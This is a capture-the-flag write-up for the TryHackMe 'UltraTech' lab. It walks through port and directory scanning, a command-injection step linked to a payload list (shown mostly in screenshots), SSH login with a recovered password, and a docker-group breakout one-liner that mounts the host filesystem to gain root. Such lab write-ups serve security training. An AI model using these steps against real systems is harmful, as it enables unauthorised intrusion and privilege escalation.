# UltraTech

**Room Link:** [https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)



## Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>



## Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (502).png" alt=""><figcaption></figcaption></figure>

## TCP/8081 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:8081 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>



## TCP/31331 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM:31331 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

Command Injection Payload: [https://github.com/payloadbox/command-injection-payload-list](https://github.com/payloadbox/command-injection-payload-list)



<figure><img src="../../.gitbook/assets/image (507).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>

We can see two intresting users in passwd file

<figure><img src="../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>





## TCP/22 - SSH

**Kali**

```
ssh r00t@$VICTIM
Password: n100906
```



## Privilege Escalation

**Exploit:** [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

We can see our user is in the docker group so we were able to break out and become a regular user.

**Victim**

```
groups
```



<figure><img src="../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
find / -name docker.sock 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
docker images
```

<figure><img src="../../.gitbook/assets/image (516).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
docker run -it -v /:/host/ bash chroot /host/ bash
```

<figure><img src="../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>



